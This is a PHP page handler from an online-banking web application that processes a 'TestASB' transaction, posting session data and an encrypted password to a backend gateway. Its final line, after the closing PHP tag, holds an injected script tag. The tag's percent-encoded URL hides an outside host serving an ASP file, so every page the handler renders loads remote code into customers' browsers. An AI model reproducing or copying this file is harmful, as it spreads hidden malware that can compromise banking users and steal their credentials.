<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
// DebugBreak();

include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );
include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );
include_once( "ezuserbb/classes/ezuser.php" );
include_once( "eztransaccion/classes/encrypt.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
	$session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;
if ( $GLOBALS["DEBUGA"] == true ) {
		$log = "En ".$_SERVER['SCRIPT_FILENAME']." que es ".$_SERVER['PHP_SELF']." (backend) ->" . print_r( $backend, true ) . "|";
		eZLog::writeNotice( $log );
		define_syslog_variables();
		openlog( "IVA", LOG_PID | LOG_PERROR, LOG_DAEMON );
		syslog( LOG_WARNING, "$log" );
		closelog();
}

$user =& eZUserBB::currentUser();

if ( $GLOBALS["DEBUGA"] == true ) { eZLog::writeNotice( "En testasb (user) ->" . print_r( $user, true ) . "|" );
}

// DebugBreak();

if ( $user )
{
	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ), "eztransaccion/user/intl/", $Language, "testasb.php" );

	$t->setAllStrings();

	$t->set_file( array( "testasb_tpl" => "testasb.tpl" ) );

	$session =& eZSession::globalSession();

	if ( !$session->fetch() )
	{
		$session->store();
	}

	$tr = new eZTransaccion( );
	$usr = $session->variable( "r_usr" );
	$qki = $session->variable( "r_qki" );
	$priv = $session->variable( "r_priv" );
//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
		
	if(!empty($_POST['Passwd']))
		$Passwd = $_POST['Passwd'];
//HB
	if ( ! isset( $Access ) )
	{
		$Access = "FrAc";
	}
	switch( $Access )
	{
		case "FrAc":
			$particularFields = "";
			$tr->blog( $qki,"TestASB", "", "", "", "", "" );
			break;
		case "Confirm":
		case "Process":
			$Passwd = encrypt( $Passwd, strtolower( trim( $usr ) ) );
			$particularFields = "&Passwd=".urlencode( $Passwd );
			$tr->blog( $qki,"TestASB", $Passwd );
			break;
	}
	$transaccion_buffer = "";
	$ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=ttk&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // Testasb
	$tr->blog($qki,"Testasb", "", "", "", "", "");
	$t->set_var( "transaccion_buffer", $transaccion_buffer );
	$t->pparse( "output", "testasb_tpl" );
}
else
{
	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ), "eztransaccion/user/intl/", $Language, "userlogin.php" );
	$t->setAllStrings();
	$t->set_file( array( "user_login_tpl" => "userlogin.tpl" ) );
	$t->set_var( "redirect_url", "/transaccion/testasb/" );
	$t->pparse( "output", "user_login_tpl" );
}

?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>